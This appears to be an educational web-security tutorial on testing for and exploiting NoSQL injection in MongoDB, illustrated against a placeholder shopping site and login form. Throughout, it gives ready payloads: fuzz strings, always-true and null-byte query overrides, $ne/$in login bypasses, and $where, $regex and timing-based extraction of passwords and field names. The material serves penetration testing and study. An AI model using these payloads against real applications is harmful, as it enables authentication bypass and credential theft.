# Testing and Exploiting NoSQL Injection in MongoDB

## Testing for NoSQL Injection
We can test the web application for NoSQL injections by entering fuzz strings as input. Example fuzz strings include:
```sql
'"`{;$Foo}$Foo \xYZ
'\"`{\r;$Foo}\n$Foo \\xYZ
```
If there is a change in the application response, we can determine which characters are interpreted as syntax by the application by injecting individual characters. For example, submitting `'` may result in the following MongoDB query:
```
this.category == '''
```

## Understanding NoSQL Injection in MongoDB
NoSQL injection is a vulnerability that allows attackers to manipulate queries sent to a NoSQL database, such as MongoDB, potentially leading to unauthorized access, data extraction, denial of service, or even remote code execution. This guide outlines how to detect and exploit NoSQL injection vulnerabilities in MongoDB.

---

## Types of NoSQL Injection
1. **Syntax Injection**: Attackers break the query syntax to inject malicious payloads, similar to SQL injection but adapted to NoSQL query languages and data structures.
2. **Operator Injection**: Attackers manipulate queries using NoSQL-specific operators (e.g., `$where`, `$ne`, `$in`, `$regex`) to alter query logic or extract data.

---

## Detecting Syntax Injection in MongoDB

### Scenario
Consider a shopping application querying a MongoDB database for products in a category, such as:
```
https://insecure-website.com/product/lookup?category=fizzy
```
This translates to the MongoDB query:
```
this.category == 'fizzy'
```

### Steps to Detect Syntax Injection
1. **Fuzz Testing**:
   - Inject a fuzz string to test if user input is improperly sanitized. For MongoDB, use a string like:
     ```
     '"`{;$Foo}$Foo \xYZ
     ```
   - URL-encoded, this becomes:
     ```
     https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
     ```
   - If the response changes (e.g., an error or different output), it may indicate unfiltered input.

2. **Testing Individual Characters**:
   - Inject a single character, such as a single quote (`'`), to form:
     ```
     this.category == '''
     ```
   - If this causes a syntax error or response change, the input may be vulnerable.
   - Confirm by escaping the quote (e.g., `\''`) to check if the query executes normally:
     ```
     this.category == '\''
     ```

3. **Testing Conditional Behavior**:
   - Send two requests to test boolean conditions:
     - False condition: `' && 0 && 'x`
     - True condition: `' && 1 && 'x`
   - If the responses differ, it suggests the application processes injected conditions, indicating a vulnerability.

### Exploiting Syntax Injection
- **Override Conditions**:
  - Inject a condition that always evaluates to true, such as:
    ```
    https://insecure-website.com/product/lookup?category=fizzy'%7c%7c%31%7c%7c%27
    ```
    This creates:
    ```
    this.category == 'fizzy'||'1'=='1'
    ```
    This returns all products, bypassing restrictions (e.g., showing hidden categories).

- **Null Character Injection**:
  - If the query includes additional restrictions, like:
    ```
    this.category == 'fizzy' && this.released == 1
    ```
  - Inject a null character (`%00`) to truncate the query:
    ```
    https://insecure-website.com/product/lookup?category=fizzy'%00
    ```
    This becomes:
    ```
    this.category == 'fizzy'' && this.released == 1
    ```
    MongoDB may ignore everything after the null, bypassing the `released == 1` condition and showing unreleased products.

**Warning**: Injecting always-true conditions can affect multiple queries, potentially causing unintended data modifications or deletions.

---

## Detecting and Exploiting Operator Injection in MongoDB

### Scenario
Consider a login request with a JSON body:
```
{"username":"wiener","password":"peter"}
```

### Detecting Operator Injection
1. **Test with Operators**:
   - Inject a MongoDB operator like `$ne`:
     ```
     {"username":{"$ne":"invalid"},"password":"peter"}
     ```
   - If the response changes (e.g., logs in as another user), the application may process operators.

2. **Bypass Authentication**:
   - Use:
     ```
     {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
     ```
     This queries all users where `username` and `password` are not "invalid," potentially logging in as the first user in the collection.
   - To target specific accounts:
     ```
     {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
     ```

3. **Switch to JSON for URL-based Inputs**:
   - If URL parameters (e.g., `username[$ne]=invalid`) fail, convert the request to POST with `Content-Type: application/json` and inject operators in the JSON body.

---

## Exploiting Syntax Injection to Extract Data

### Scenario
A user lookup request:
```
https://insecure-website.com/user/lookup?username=admin
```
This triggers:
```
{"$where":"this.username == 'admin'"}
```

### Extracting Data with JavaScript
- **Inject JavaScript via `$where`**:
  - Payload:
    ```
    admin' && this.password[0] == 'a' || 'a'=='b'
    ```
    This checks if the password starts with 'a'. Repeat for each character to extract the full password.
  - Alternatively, use `match()`:
    ```
    admin' && this.password.match(/\d/) || 'a'=='b'
    ```
    This checks if the password contains digits.

### Identifying Field Names
- Test for field existence:
  ```
  admin' && this.password!=''
  ```
  Compare responses with known (e.g., `username`) and non-existent (e.g., `foo`) fields:
  ```
  admin' && this.username!=''
  admin' && this.foo!=''
  ```
  If the `password` response matches the `username` response, the `password` field exists.
- Use a dictionary attack with a wordlist to guess field names.

---

## Exploiting Operator Injection to Extract Data

### Injecting Operators
- Test `$where` with boolean conditions:
  ```
  {"username":"wiener","password":"peter","$where":"0"}
  {"username":"wiener","password":"peter","$where":"1"}
  ```
  A response difference indicates JavaScript evaluation.

### Extracting Field Names
- Use `Object.keys()`:
  ```
  "$where":"Object.keys(this)[0].match('^.{0}a.*')"
  ```
  This extracts the first character of the first field name. Iterate to reconstruct the full name.

### Extracting Data with `$regex`
- Test `$regex`:
  ```
  {"username":"admin","password":{"$regex":"^.*"}}
  ```
  If the response differs from an incorrect password, `$regex` is processed.
- Extract password character by character:
  ```
  {"username":"admin","password":{"$regex":"^a.*"}}
  ```
  This checks if the password starts with 'a'. Repeat for other characters.

---

## Timing-Based NoSQL Injection
When error-based injection doesn't yield response differences, use timing-based payloads to detect vulnerabilities:
1. **Measure Baseline**:
   - Load the page multiple times to establish normal response time.
2. **Inject Timing Payload**:
   - Example:
     ```
     {"$where":"sleep(5000)"}
     ```
     This delays the response by 5 seconds if executed.
   - For password extraction:
     ```
     admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
     ```
     or
     ```
     admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
     ```
     A delayed response indicates the password starts with 'a'.
3. **Analyze Response Time**:
   - A noticeable delay confirms successful injection.

---

## Key Considerations
- **Adapt Payloads**: Fuzz strings and payloads must match the input context (URL-encoded for GET, JSON for POST).
- **Avoid Data Loss**: Always-true conditions can affect unintended queries, risking data modification.
- **Operator Variability**: MongoDB operators like `$where`, `$ne`, `$in`, and `$regex` vary by database and application configuration.
- **Field Discovery**: Use JavaScript (`keys()`) or `$regex` to systematically extract field names without guessing.

---
